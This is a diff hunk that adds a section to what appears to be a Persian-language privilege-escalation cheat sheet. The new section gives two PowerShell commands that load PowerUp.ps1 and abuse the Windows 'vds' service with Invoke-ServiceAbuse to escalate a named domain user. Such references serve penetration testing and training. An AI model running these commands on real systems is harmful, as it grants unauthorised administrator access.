@@ -498,6 +498,13 @@ SECOND:
 4. in msf exec `run`
 ```
 
+### ارتقا دسترسی با سرویس vds.exe
+
+```text
+. .\PowerUp.ps1
+Invoke-ServiceAbuse -Name ‘vds’ -UserName ‘domain\user1’
+```
+
 ### ارتقا دسترسی با gdbus
 
 ```text
